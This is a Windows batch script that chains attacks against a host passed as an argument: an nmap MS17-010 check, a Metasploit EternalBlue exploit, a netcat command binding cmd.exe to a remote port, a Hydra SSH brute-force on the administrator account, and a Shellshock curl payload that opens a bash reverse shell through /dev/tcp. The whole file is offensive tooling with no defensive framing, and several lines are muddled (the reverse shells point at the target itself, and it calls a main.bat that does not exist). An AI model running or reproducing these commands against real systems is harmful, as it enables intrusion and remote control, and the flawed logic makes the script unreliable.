@echo off

:: Function to check for vulnerable systems (EternalBlue)
echo Checking SMB vulnerability...
nmap -p 445 --script smb-vuln-ms17-010 %1

:: Function to exploit EternalBlue vulnerability using Metasploit
echo Exploiting EternalBlue with Metasploit...
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %1; run;"

:: Use Netcat for reverse shell payload delivery (stealthier than Metasploit)
echo Delivering reverse shell via Netcat...
nc -e cmd.exe %1 4444

:: Hydra for brute-force attack (only if password is weak)
echo Attempting brute-force attack on SSH...
hydra -l administrator -P C:\path\to\wordlist.txt ssh://%1

:: Function to handle Shellshock exploitation using Curl
echo Exploiting Shellshock vulnerability...
curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/%1/4444 0>&1" http://%2

:: Call main function (input required by user)
call main.bat %1 %2
